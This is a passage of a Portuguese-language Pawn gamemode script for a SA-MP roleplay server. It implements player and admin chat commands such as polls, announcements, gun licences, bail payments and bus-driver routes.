		format(gFile, sizeof(gFile), "clans/%s.ini", playerClan[playerid]);
		if(strcmp(WE_GetString(gFile, "Dono"), PlayerName(playerid), false))
		{
  			format(gstring, sizeof(gstring), "Você não é dono(a) do clã '%s'", playerClan[playerid]);
	    	SendClientMessage(playerid, COR_ERRO, gstring);
	    	return 1;
		}
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, COR_ERRO, "Uso válido: /CorCla [Cor ID]");
			SendClientMessage(playerid, COR_ERRO, "OBS: Somente cores com ID de 1 à 43.");
			return 1;
		}
		new
			corcla = strval(tmp)
		;
		if(corcla < 1 || corcla > 43)
		{
			SendClientMessage(playerid, COR_ERRO, "OBS: Somente cores com ID de 1 à 43.");
			return 1;
		}
		WE_SetInt(gFile, "Color", corcla);
		format(gStr, sizeof(gStr), "A cor do seu clã '{FFFFFF}%s{1E90FF}' foi alterada para cor ID %d.", playerClan[playerid], corcla);
		SendClientMessage(playerid, AZUL_WE, gStr);
		SendClientMessage(playerid, SetVehCorName(corcla), "Cor do clã alterada.");
		clanColor[playerid] = corcla;
		foreach(Player, c)
		{
		    if(c != playerid && !strcmp(playerClan[c], playerClan[playerid], true))
		    {
		  		format(gStr, 128, "~w~%s ~r~~h~Alterou a cor do cla", PlayerName(playerid));
				GameTextForPlayer(c, gStr, 5000, 15);
				format(gstring, sizeof(gstring), "{FFFFFF}%s líder do seu clã, alterou a cor do mesmo.", PlayerName(playerid));
				SendClientMessage(c, COR_AMARELO, gstring);
				SendClientMessage(c, SetVehCorName(corcla), "Cor do clã alterada.");
		  		clanColor[c] = corcla;
			}
		}
		return 1;
	}
	if(!strcmp(cmd, "/membroscla", true))
	{
		if(in_z[playerid] != -1)
		{
		    SendClientMessage(playerid, COR_ERRO, "Você só pode utilizar comandos de clã fora das Gangue Zones!");
		    return 1;
		}
		if(!strcmp(playerClan[playerid], " ", true))
  		{
  		    SendClientMessage(playerid, COR_ERRO, "Você não percente a nenhum clã!");
  		    return 1;
  		}
		format(gFile, sizeof(gFile), "clans/%s.ini", playerClan[playerid]);
		new
			m_id[24], m_nn[64], stg[1024]
		;
 		format(gStr, sizeof(gStr), "\t{1E90FF}%s\n\n\t{FFFFFF}Líder {FF1E1E}%s\n\n{FFFFFF}Membros:\n\n", playerClan[playerid], WE_GetString(gFile, "Dono"));
		strcat(stg, gStr);

		for(new m = 1; m < 31; ++m)
		{
		    format(m_id, 24, "Membro%d", m);

	    	if(strcmp(WE_GetString(gFile, m_id), "Ninguem", false))
	    	{
	    	    format(m_nn, 64, "{1E90FF}%s (%d)\n", WE_GetString(gFile, m_id), m);
	    	    strcat(stg, m_nn);
	    	}
	    }
		ShowPlayerDialog(playerid, 1458, DIALOG_STYLE_MSGBOX, " Membros do clã", stg, "Fechar", "");
		return 1;
	}
	if(!strcmp(cmd, "/comandoscla", true))
	{
		if(in_z[playerid] != -1) // GZ
		{
		    SendClientMessage(playerid, COR_ERRO, "Você só pode usar comandos de clã fora das Gangue Zones!");
		    return 1;
		}
	    SendClientMessage(playerid, VERMELHO_WE, " [Comandos para Clã] ");
	    SendClientMessage(playerid, AZUL_WE, "/CriarCla  /ExcluirCla {FFFFFF}(Cria ou exclui um clã)");
	    SendClientMessage(playerid, AZUL_WE, "/ConvidarCla  /ExpulsarCla {FFFFFF}(Convida ou expulsa um membro)");
	    SendClientMessage(playerid, AZUL_WE, "/Aceitar  /Recusar {FFFFFF}(Aceita ou recusa um convite)");
	    SendClientMessage(playerid, AZUL_WE, "/SairCla {FFFFFF}(Sai do clã) {1E90FF} ![Mensagem] {FFFFFF}(Chat do clã)");
	    SendClientMessage(playerid, AZUL_WE, "/CorCla {FFFFFF}(Altera a cor do clã) {1E90FF} /MembrosCla {FFFFFF}(Lista de membros)");
	    SendClientMessage(playerid, VERMELHO_WE, " [Comandos para Clã] ");
	    return 1;
	}*/
	if(!strcmp(cmdtext, "/tutorial", true))
	{
		new
			Float:poSox, Float:poSoy, Float:poSoz, Float:poSoa
		;
		GetPlayerPos(playerid, poSox, poSoy, poSoz);
		GetPlayerFacingAngle(playerid, poSoa);
		oPosx[playerid] = poSox;
		oPosy[playerid] = poSoy;
		oPosz[playerid] = poSoz;
		oPosa[playerid] = poSoa;
		NoTuto[playerid] = true;
		TutoID[playerid] = 1;
		TextDrawHideForPlayer(playerid, InfoLevel[playerid]);
		TextDrawHideForPlayer(playerid, WE_GAMES1);
		TextDrawHideForPlayer(playerid, WE_GAMES2);
		TextDrawHideForPlayer(playerid, LoginScreen[0]);
		TextDrawHideForPlayer(playerid, LoginScreen[1]);
		TextDrawHideForPlayer(playerid, LoginScreen[2]);
		TextDrawHideForPlayer(playerid, LoginScreen[3]);
		TextDrawHideForPlayer(playerid, LoginScreen[4]);
		TextDrawHideForPlayer(playerid, LoginScreen[5]);
		TextDrawHideForPlayer(playerid, LoginScreen[6]);
		TextDrawHideForPlayer(playerid, LoginScreen[7]);
		TextDrawHideForPlayer(playerid, BoxCarregando);
		TextDrawHideForPlayer(playerid, Flash);
		TextDrawHideForPlayer(playerid, Relogio);
		TextDrawHideForPlayer(playerid, Data);
		TextDrawHideForPlayer(playerid, InfoSite);
		TextDrawHideForPlayer(playerid, RDinheiro);
		TextDrawHideForPlayer(playerid, Barra1);
		TextDrawHideForPlayer(playerid, Barra2);
		TextDrawHideForPlayer(playerid, Barra3);
		TextDrawHideForPlayer(playerid, TextNomeServer);
		TextDrawHideForPlayer(playerid, TextNomeSite);
		TextDrawHideForPlayer(playerid, Textdraw0S);
		TextDrawHideForPlayer(playerid, Textdraw1S);
		TextDrawHideForPlayer(playerid, Textdraw2);
		TextDrawHideForPlayer(playerid, Player_barEat[playerid]);
		TextDrawHideForPlayer(playerid, Textdraw4);
		TextDrawHideForPlayer(playerid, Textdraw5);
		TextDrawHideForPlayer(playerid, Textdraw6);
		TextDrawHideForPlayer(playerid, Player_barDrink[playerid]);
		TextDrawHideForPlayer(playerid, Textdraw8);
		TextDrawHideForPlayer(playerid, Textdraw9);
		TextDrawHideForPlayer(playerid, Textdraw10);
		TextDrawHideForPlayer(playerid, Textdraw11);
		TextDrawHideForPlayer(playerid, Player_barSleep[playerid]);
		LimparChat(playerid, 150);
		SetPlayerInterior(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
		TogglePlayerSpectating(playerid, true);
	    SetPlayerCameraPos(playerid, 365.351654, -2145.143066, 41.203365);
		SetPlayerCameraLookAt(playerid, 365.447052, -2140.324951, 39.870460);
		SetSpawnInfo(playerid,0,pInfo[playerid][SkinP], poSox, poSoy, poSoz, poSoa,0,0,0,0,0,0);
		SpawnPlayer(playerid);
		InterpolateCameraPos(playerid, 956.8359, -2071.6855, 38.4553, 365.351654, -2145.143066, 41.203365, 7000);
		InterpolateCameraLookAt(playerid, 745.3615, -1843.4775, 7.8833, 365.447052, -2140.324951, 39.870460, 7000);
		SetTimerEx("TutorialText", 7000, false, "id", playerid, 1);
		return 1;
	}
	if(!strcmp(cmd, "/abencoar", true))
	{
		if(pInfo[playerid][Prof] == PADRE)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /abencoar [ID]");
				return 1;
            }
            new id = strval(tmp);
            if(IsPlayerConnected(id))
            {
                SendClientFormat(playerid, COR_AMARELO, "Você abençoou %s com sucesso!", PlayerName(id));
                SendClientFormat(id, COR_BRANCO, "Você abençoado pelo padre %s", PlayerName(playerid));
                return 1;
			}
            else
            {
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
            }
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
			return 1;
		}
	}
	if(strcmp(cmd, "/atipo", true) == 0)
	{
	    if(aInfo[playerid][Admin] == 1)
	    {
		    tmp = strtok(cmdtext, idx);
			if(!strlen(tmp)) return SendClientMessage(playerid, 0xFF3300AA, "Uso válido: /aTipo [de 0 à 3]");
  			new Tipo = strval(tmp);
  			if(Tipo < 0 || Tipo > 3) return SendClientMessage(playerid, 0xFF3300AA, "Somente anúncios de 0 à 3!");
    		format(gstring, sizeof(gstring), "Anúncios definido para o tipo de textdraw %d.", Tipo);
			SendClientMessage(playerid, 0x00CCCCAA, gstring);
			T_Tipo[playerid] = Tipo;
		    return 1;
		}
		else return SendClientMessage(playerid, 0xFF3300AA, "Você não tem permissão para usar esse comando!");
	}
	if(strcmp(cmd, "/anome", true) == 0)
	{
	    if(aInfo[playerid][Admin] == 1)
	    {
			pNome[playerid] = (pNome[playerid] == 1) ? 0 : 1;
			format(gstring, sizeof(gstring), "Anúncios %s para mostrar seu nome/nick.", (pNome[playerid] == 1 ? ("ativados") : ("desativados")));
			SendClientMessage(playerid, 0x00CCCCAA, gstring);
			return 1;
		}
		else return SendClientMessage(playerid, 0xFF3300AA, "Você não tem permissão para usar esse comando!");
	}
	if(strcmp(cmd, "/acolor", true) == 0)
	{
	    if(aInfo[playerid][Admin] == 1)
	    {
		    tmp = strtok(cmdtext, idx);
			if(!strlen(tmp)) return SendClientMessage(playerid, 0xFF3300AA, "Uso válido: /aColor [de 1 à 16]");
  			new Tipo = strval(tmp);
  			if(Tipo < 1 || Tipo > 16) return SendClientMessage(playerid, 0xFF3300AA, "Somente cores de 1 à 16!");
    		format(gstring, sizeof(gstring), "Anúncios definido para cor n°%d.", Tipo);
			SendClientMessage(playerid, 0x00CCCCAA, gstring);
			TextCor[playerid] = Tipo;
		    return 1;
		}
		else return SendClientMessage(playerid, 0xFF3300AA, "Você não tem permissão para usar esse comando!");
	}
	if(strcmp(cmd, "/a", true) == 0)
	{
	    if(aInfo[playerid][Admin] == 1)
	    {
			new length = strlen(cmdtext);
	  		while ((idx < length) && (cmdtext[idx] <= ' '))
			{
		  		idx++;
			}
		 	new offset = idx;
			new result[64];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
		  		result[idx - offset] = cmdtext[idx];
		      	idx++;
		 	}
		  	result[idx - offset] = EOS;
	    	if(!strlen(result)) return SendClientMessage(playerid, 0xFF3300AA, "Uso válido: /A [Mensagem]");
     		new
				sAn[256 + 256]
			;
	    	if(Anunciado == 0)
			{
				for(new t ; t < 4; t++)
				{
					TextDrawHideForAll(TextAnuncio[t]);
				}
				KillTimer(T_Timer);
			    if(pNome[playerid] == 0)
			    {
			        format(sAn, sizeof(sAn), "~w~~h~%s", result);
					TextDrawSetString(TextAnuncio[T_Tipo[playerid]], sAn);
					TextDrawShowForAll(TextAnuncio[T_Tipo[playerid]]);
				}
				else if(pNome[playerid] == 1)
				{
					format(sAn, sizeof(sAn), "%s%s: ~w~~h~%s", "~b~~h~~h~", PlayerName(playerid), result);
					TextDrawSetString(TextAnuncio[T_Tipo[playerid]], sAn);
					TextDrawShowForAll(TextAnuncio[T_Tipo[playerid]]);
				}
			}
			else if(Anunciado == 1)
			{
  				for(new t; t < 4; t++)
				{
					TextDrawHideForAll(TextAnuncio[t]);
				}
				KillTimer(T_Timer);
			    if(pNome[playerid] == 0)
			    {
			        format(sAn, sizeof(sAn), "~w~~h~%s", result);
					TextDrawSetString(TextAnuncio[T_Tipo[playerid]], sAn);
				}
				else if(pNome[playerid] == 1)
				{
					format(sAn, sizeof(sAn), "%s%s: ~w~~h~%s", "~b~~h~~h~", PlayerName(playerid), result);
					TextDrawSetString(TextAnuncio[T_Tipo[playerid]], sAn);
				}
			}
			T_Timer = SetTimer("RemoveTextDraw", 10000, false);
			return 1;
		}
		else return SendClientMessage(playerid, 0xFF3300AA, "Você não tem permissão para usar esse comando!");
	}
	if(!strcmp(cmd, "/enquete", true))
	{
	    if(aInfo[playerid][Admin] == 1)
	    {
		    if(vTempo > 0)
			{
			    SendClientMessage(playerid, COR_ERRO, "Uma enquete já foi iniciada aguarde!");
				return 1;
			}
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
			    SendClientMessage(playerid, COR_ERRO, "Uso válido: /Enquete [Tempo] [Pergunta]");
				return 1;
			}
			new
				timer = strval(tmp)
			;
			if(timer < 5 || timer > 60)
			{
			    SendClientMessage(playerid, COR_ERRO, "Somente de 5 à 60 segundos!");
				return 1;
			}

			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
			  	idx++;
			}
			new offset = idx;
			new result[64];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;

			if(!strlen(result))
			{
			    SendClientMessage(playerid, COR_ERRO, "Uso válido: /Enquete [Tempo] [Pergunta]");
				return 1;
			}
			enquetep = result;
			VotacaoIniciada = 1;
			new
				votos[1024]
			;
			format(votos, sizeof(votos), "~b~~h~Enquete~n~~n~~g~~h~Pergunta: ~w~%s~n~~n~~y~Use: ~w~/Sim ~y~ou ~w~/Nao~n~~n~Votos computados: ~n~> [0] Sim - [0] Nao", result);
			TextDrawSetString(Enquete, votos);
			TextDrawShowForAll(Enquete);
			format(gstring, sizeof(gstring), "~n~~n~~y~~h~Tempo restante~n~~n~%d", timer);
			TextDrawSetString(ContagemEnquete, gstring);
			TextDrawShowForAll(ContagemEnquete);
			vTempo = timer;
			TempoVotacao();
			return 1;
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
			return 1;
		}
	}
	if(!strcmp(cmd, "/sim", true))
	{
	    if(VotacaoIniciada == 1)
	    {
	        if(Votou[playerid] == 0)
	        {
				SendClientMessage(playerid, 0x00FF99AA, "Seu voto foi computado com sucesso!");
                Votou[playerid] = 1;
				vSim ++;
			}
			else
			{
			    SendClientMessage(playerid, COR_ERRO, "Você já votou nessa enquete!");
			}
			return 1;
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Não foi iniciado nenhuma enquete!");
		}
		return 1;
	}
	if(!strcmp(cmd, "/nao", true))
	{
	    if(VotacaoIniciada == 1)
	    {
			if(Votou[playerid] == 0)
	        {
			 	SendClientMessage(playerid, 0x00FF99AA, "Seu voto foi computado com sucesso!");
			 	Votou[playerid] = 1;
			 	vNao ++;
 			}
			else
			{
			    SendClientMessage(playerid, COR_ERRO, "Você já votou nessa enquete!");
			}
			return 1;
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Não foi iniciado nenhuma enquete!");
		}
		return 1;
	}
	if(!strcmp(cmd, "/habs", true))
	{
	    new habs[500];
	    format(habs, sizeof(habs), "Pistolas: %d\nShotguns: %d\nMicro SMGs: %d\nSMG (MP5): %d\nRifles: %d\nSniper: %d", pInfo[playerid][Pistolas], pInfo[playerid][Shotguns], pInfo[playerid][Micros], pInfo[playerid][SubMG], pInfo[playerid][Rifles], pInfo[playerid][Sniper]);
	    ShowPlayerDialog(playerid, 9983, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Habilidades com armas", habs, "Fechar", "");
	    return 1;
	}
	if(!strcmp(cmd, "/rg", true))
	{
	    format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
	    //format(pFile, sizeof(pFile), "clans/%s.ini", PlayerName(playerid));

	    new Stats[4000], HTCarro[25], HTMoto[25], HTCaminhao[25], HNBarco[25], HAHeli[25], HAAviao[25], HTTrem[25], TC[25], TM[25], CID;

		if(pInfo[playerid][HabTCarro] == 1) { HTCarro = "{3DB134}Habilitado"; } else if(pInfo[playerid][HabTCarro] == 0) { HTCarro = "{FF1E1E}Não habilitado"; }
        if(pInfo[playerid][HabTMoto] == 1) { HTMoto = "{3DB134}Habilitado"; } else if(pInfo[playerid][HabTMoto] == 0) { HTMoto = "{FF1E1E}Não habilitado"; }
        if(pInfo[playerid][HabTCaminhao] == 1) { HTCaminhao = "{3DB134}Habilitado"; } else if(pInfo[playerid][HabTCaminhao] == 0) { HTCaminhao = "{FF1E1E}Não habilitado"; }
        if(pInfo[playerid][HabNBarco] == 1) { HNBarco = "{3DB134}Habilitado"; } else if(pInfo[playerid][HabNBarco] == 0) { HNBarco = "{FF1E1E}Não habilitado"; }
        if(pInfo[playerid][HabAHeli] == 1) { HAHeli = "{3DB134}Habilitado"; } else if(pInfo[playerid][HabAHeli] == 0) { HAHeli = "{FF1E1E}Não habilitado"; }
        if(pInfo[playerid][HabAAviao] == 1) { HAAviao = "{3DB134}Habilitado"; } else if(pInfo[playerid][HabAAviao] == 0) { HAAviao = "{FF1E1E}Não habilitado"; }
        if(pInfo[playerid][HabTTrem] == 1) { HTTrem = "{3DB134}Habilitado"; } else if(pInfo[playerid][HabTTrem] == 0) { HTTrem = "{FF1E1E}Não habilitado"; }

		if(fexist(gFile))
		{
   			if(WE_GetInt(gFile, "Casa") > -1)
			{
				if(strcmp(CasaInfo[WE_GetInt(gFile, "Casa")][Proprietario], PlayerName(playerid), false))
				{
					TC = "Não";
				}
				else if(strcmp(CasaInfo[WE_GetInt(gFile, "Casa")][Proprietario], PlayerName(playerid), true) == 0)
				{
				    TC = "Sim"; CID = WE_GetInt(gFile, "Casa");
				}
			}
			if(WE_GetInt(gFile, "MorandoID") != -1)
			{
				if(strcmp(CasaInfo[WE_GetInt(gFile, "MorandoID")][Morador], PlayerName(playerid), true) == 0 || strcmp(CasaInfo[WE_GetInt(gFile, "MorandoID")][Morador2], PlayerName(playerid), true) == 0 || strcmp(CasaInfo[WE_GetInt(gFile, "MorandoID")][Morador3], PlayerName(playerid), true) == 0)
				{
					TM = "Sim";
				}
				else
				{
					TM = "Não";
				}
			}
		}
		new PC[19];
		if(fexist(pFile))
		{
		    PC = "{00FF00}Possui";
		}
		else if(!fexist(pFile))
		{
		    PC = "{FF0000}Não possui";
		}
		new RU[19];
		if(pInfo[playerid][Tem_RelogioUP] == 1)
		{
			RU = "{00FF00}Possui";
		}
		else if(pInfo[playerid][Tem_RelogioUP] == 0)
		{
			RU = "{FF0000}Não possui";
		}
		new TB[19];
		if(WE_GetInt(gFile, "ContaBanco") == 1)
		{
		    TB = "{00FF00}Possui";
		}
		else if(WE_GetInt(gFile, "ContaBanco") == 0)
		{
		    TB = "{FF0000}Não possui";
		}
		new TS[19];
		if(WE_GetInt(gFile, "Seguro") == 1)
		{
		    TS = "{00FF00}Possui";
		}
		else if(WE_GetInt(gFile, "Seguro") == 0)
		{
		    TS = "{FF0000}Não possui";
		}
		new TCO[19];
		if(WE_GetInt(gFile, "Convenio") == 1)
		{
		    TCO = "{00FF00}Possui";
		}
		else if(WE_GetInt(gFile, "Convenio") == 0)
		{
		    TCO = "{FF0000}Não possui";
		}
		new SX[10];
		if(WE_GetInt(gFile, "Sexo") == 1)
		{
		    SX = "Masculino";
		}
		else if(WE_GetInt(gFile, "Sexo") == 2)
		{
		    SX = "Feminino";
		}
		new pqp[3000], pqp2[3000], pqp3[3000];
    	format(pqp, sizeof(pqp), "{1E90FF}Nome: {FFFFFF}%s\n{1E90FF}Sexo: {FFFFFF}%s\n{1E90FF}Cônjuge: {FFFFFF}%s\n{3DB134}Dinheiro em mãos: {3DB134}R$%d\n{1E90FF}Casa: %s {1E90FF}ID {FFFFFF}%d", PlayerName(playerid), SX, WE_GetString(gFile, "CasadoCom"), GetPlayerCash(playerid), CID, TM);
   		format(pqp2, sizeof(pqp2), "{FFF000}Hab. Carro: %s\n{FFF000}Hab. Moto: %s\n{FFF000}Hab. Caminhão: %s\n{FFF000}Hab. Barco: %s\n{FFF000}Hab. Avião: %s\n{FFF000}Hab. Helicoptero: %s", HTCarro, HTMoto, HTCaminhao, HNBarco, HAAviao, HAHeli);
		format(gstring, sizeof(gstring), "{1E90FF}Skin {FFFFFF}%s - %d\n{FF1E1E}Pontos Favela: {FFFFFF}%d", GetSkinName(GetPlayerSkin(playerid)), GetPlayerSkin(playerid), PC, WE_GetInt(gFile, "Matou"));
		format(pqp3, sizeof(pqp3), "{3DB134}Conta bancária: %s\n{1E90FF}Seguro de Acidêntes: %s\n{1E90FF}Convênio: %s\n", TB, TS, TCO);
		format(Stats, sizeof(Stats), "%s\n%s\n%s", pqp, pqp2, gstring, pqp3);
		ShowPlayerDialog(playerid, 9982, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Registro Geral", Stats, "Fechar", "");
		return 1;
	}
	if(!strcmp(cmd, "/armas", true))
	{
		if(PlayerToPoint(1.1, playerid, 313.62061, -139.51691, 1003.05670))
		{
		    if(WE_GetInt(f(playerid), "HabP") == 0)
		    {
 			    SendClientMessage(playerid, COR_ERRO, "O atendente da Ammunation se recusa a vender armas sem o porte.");
 			    SendClientMessage(playerid, COR_ERRO, "Vá até a delegacia e adquira seu porte de armas.");
			    return 1;
			}
			ShowPlayerDialog(playerid, SLOT_ARMAS, DIALOG_STYLE_LIST, "{FF6633}Ammunation Viva WE", "{FF0000}Armas de Fogo\n{FFFFFF}Armas Brancas\n{1E90FF}Acessórios", "Ver", "Sair");
			return 1;
		}
		else SendClientMessage(playerid, COR_ERRO, "Você não está no checkpoint das armas na Ammunation!");
		return 1;
	}
	if(strcmp(cmd, "/comprarporte", true) == 0)
	{
	    format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));

		if(PlayerToPoint(1.1, playerid, 1567.8768,-1675.5853,16.2505))
		{
		    if(pInfo[playerid][Level] < 10)
		    {
  				SendClientMessage(playerid, COR_ERRO, "Você não possui 10 níveis.");
			    return 1;
		    }
		    if(GetPlayerCash(playerid) < 10000)
		    {
  				SendClientMessage(playerid, COR_ERRO, "Você não possui dinheiro suficiente. ({009900}R$10000{FF0000})");
			    return 1;
			}
			if(WE_GetInt(gFile, "HabP") == 1)
			{
			  	SendClientMessage(playerid, COR_ERRO, "Você já possui um porte de armas.");
			  	return 1;
			}
			SendClientMessage(playerid, -1, "Você comprou o porte de armas.");
			SendClientMessage(playerid, COR_ERRO, "ATENÇÃO! {FFFFFF}Ao morrer, você perderá as armas fora do inventário!");
			sGivePlayerCash(playerid, -10000);
			WE_SetInt(gFile, "HabP", 1);
			return 1;
		}
		else SendClientMessage(playerid, COR_ERRO, "Você não está na delegacia!");
	    return 1;
	}
	if(strcmp(cmd, "/treinar", true) == 0)
	{
		if(PlayerToPoint(1.1, playerid, 313.62061, -139.51691, 1003.05670)) // Mudar
		{
	        ShowPlayerDialog(playerid, D_TREINOAMMU, DIALOG_STYLE_LIST, "{FF0000}Aumente suas habilidades!", "{FFFFFF}Pistolas - {3DB134}R$700\n{FFFFFF}Shotguns - {3DB134}R$1.200\n{FFFFFF}Micro SMGs - {3DB134}R$1.600\n{FFFFFF}Sub MachineGuns - {3DB134}R$2.100\n{FFFFFF}Rifles - {3DB134}R$3.000\n{FFFFFF}Sniper - {3DB134}R$5.000", "Treinar", "Cancelar");
		}
		else SendClientMessage(playerid, COR_ERRO, "Você não está no local de treinamento!");
	    return 1;
	}
	if(strcmp(cmd, "/pagarfianca", true) == 0)
	{
	    format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));

		if(PlayerToPoint(1.1, playerid, 1567.8768,-1675.5853,16.2505))
		{
		    tmp = strtok(cmdtext, idx);
        	if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /PagarFianca [ID]");
			    return 1;
            }
            new
				id = strval(tmp)
			;
          	if(!IsPlayerConnected(id))
          	{
             	SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
	       		return 1;
          	}
          	if(GetPlayerCash(playerid) < 15000)
          	{
          	    SendClientMessage(playerid, COR_ERRO, "Você não tem R$10000, para pode paga ra fiança de alguém!");
          	    return 1;
          	}
          	format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(id));
         	if(WE_GetInt(gFile, "Abuser") == 1)
         	{
            	SendClientMessage(playerid, COR_BRANCO, "Esse jogador é abuser e foi preso por um administrador!");
             	SendClientMessage(playerid, COR_BRANCO, "Somente um adminstrador pode pagar fiança para ele!");
	     		return 1;
       		}
   	    	if(playerid == id)
         	{
				SendClientMessage(playerid, COR_ERRO, "Você não pode pagar fiança para você mesmo!");
				return 1;
      		}
	     	if(pInfo[id][Preso] == 0)
        	{
				SendClientFormat(playerid, COR_AMARELO, "O(A) jogador(a) %s não está preso!", PlayerName(id));
				return 1;
        	}
 			SendClientFormat(id, 0x3366FFAA, "O(A) jogador(a) %s pagou sua fiança. Não cometa mais nenhum crime ou será preso novamente!", PlayerName(playerid));
          	SendClientFormat(playerid, 0x33CCFFAA, "Você pagou a fiança do(a) jogador(a) %s, por R$10000.", PlayerName(id));
			pInfo[id][Preso] = 0;
			sGivePlayerCash(playerid, -15000);
			return 1;
		}
		else SendClientMessage(playerid, COR_ERRO, "Você não está na delegacia!");
	    return 1;
	}
	if(strcmp(cmd, "/setarprof", true) == 0)
	{
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /SetarProf [ID]");
			    return 1;
            }
            new
				id = strval(tmp)
			;
            if(!IsPlayerConnected(id))
            {
                SendClientMessage(playerid, COR_ERRO, "Jogador(a) não está conectado!");
				return 1;
			}
			SendClientFormat(id, AZUL_WE, "O(A) administrador(a) %s tornou você um(a) caminhoneiro(a).", PlayerName(playerid));
			SendClientFormat(playerid, AZUL_WE, "Você tornou %s um caminhoneiro.", PlayerName(id));
          	pInfo[id][Prof] = CAMINHONEIRO;
			SpawnProf(id);
			SetColor(id);
			return 1;
		}
		else
		{
            SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
			return 1;
		}
	}
	if(strcmp(cmd, "/setnb", true) == 0)
	{
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || aInfo[playerid][Ajudante] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /setNB [ID]");
			    return 1;
            }
            new
				id = strval(tmp)
			;
            if(!IsPlayerConnected(id))
            {
                SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
			}
			SendClientFormat(id, COR_AMARELO, "{1E90FF}O(A) administrador(a) %s setou para você a profissão de caminhoneiro.", PlayerName(playerid));
			SendClientFormat(id, AZUL_WE, "O(A) administrador(a) %s lhe deu a habilitação terrestre.", PlayerName(playerid));
			SendClientFormat(playerid, COR_AMARELO, "{1E90FF}Você tornou %s um caminhoneiro, e setou a habilitação terrestre.", PlayerName(id));
          	pInfo[id][Prof] = CAMINHONEIRO;
			WE_SetInt(f(id), "HabTCarro", 1);
			pInfo[id][HabTCarro] = 1;
			WE_SetInt(f(id), "HabTMoto", 1);
			pInfo[id][HabTMoto] = 1;
			WE_SetInt(f(id), "HabTCaminhao", 1);
			pInfo[id][HabTCaminhao] = 1;
			WE_SetInt(f(id), "HabTTrem", 1);
			pInfo[id][HabTTrem] = 1;
			SpawnProf(id);
			SetColor(id);
			TogglePlayerControllable(id, true);
			return 1;
		}
		else
		{
            SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
			return 1;
		}
	}
 	if(!strcmp(cmd, "/iniciarrota", true))
	{
		if(pInfo[playerid][Prof] != MOTORISTA_ONIBUS)
		{
			SendClientMessage(playerid, COR_ERRO, "Você não é um(a) Motorista de Ônibus!");
			return 1;
		}
     	if(!PlayerToPoint(5.0, playerid, 2278.4102, -2329.2820, 13.5469))
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está na área Motorista de Ônibus!");
		    return 1;
		}
		if(tempoBus[playerid] > 0)
		{
			return 1;
		}
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 431)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não está em um ônibus!");
	        return 1;
		}
		if(RotaBus[playerid] > 0)
		{
			SendClientMessage(playerid, COR_ERRO, "Sua rota de ônibus já foi iniciada!");
		}
		else if(RotaBus[playerid] <= 0)
		{
			tempoBus[playerid] = 5;
			timerBus[playerid] = SetTimerEx("TempoRotaBus", 1000, false, "d", playerid);
			GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~p~Aguarde para iniciar...", 1000, 5);
			TogglePlayerControllable(playerid, false);
		}
  		return 1;
	}
	if(!strcmp(cmd, "/proximoponto", true))
	{
		if(pInfo[playerid][Prof] != MOTORISTA_ONIBUS)
		{
			SendClientMessage(playerid, COR_ERRO, "Você não é um(a) Motorista de Ônibus!");
			return 1;
		}
		if(tempoBus[playerid] > 0)
		{
			return 1;
		}
		if(!IsPlayerInAnyVehicle(playerid))
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está em um ônibus!");
		    return 1;
		}
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 431)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não está em um ônibus!");
	        return 1;
		}
		CheckPontoBusPlayer(playerid);
  		return 1;
	}
	if(!strcmp(cmd, "/pontofinal", true))
	{
     	if(PlayerToPoint(5.0, playerid, 2278.4102, -2329.2820, 13.5469))
     	{
		    if(pInfo[playerid][Prof] != MOTORISTA_ONIBUS)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não é um(a) Motorista de Ônibus!");
			    return 1;
			}
			if(tempoBus[playerid] > 0)
			{
				return 1;
			}
			if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 431)
		    {
		        SendClientMessage(playerid, COR_ERRO, "Você não está em um ônibus!");
		        return 1;
			}
			if(RotaBus[playerid] != 21)
			{
				SendClientMessage(playerid, COR_ERRO, "Você não fez uma rota completa ou não iniciou uma!");
			}
			else
			{
				RotaBus[playerid] = -1;
				tempoBus[playerid] = -1;
		        GameTextForPlayer(playerid, "~b~~h~ROTA CONCLUIDA~w~~h~!", 1000, 1);
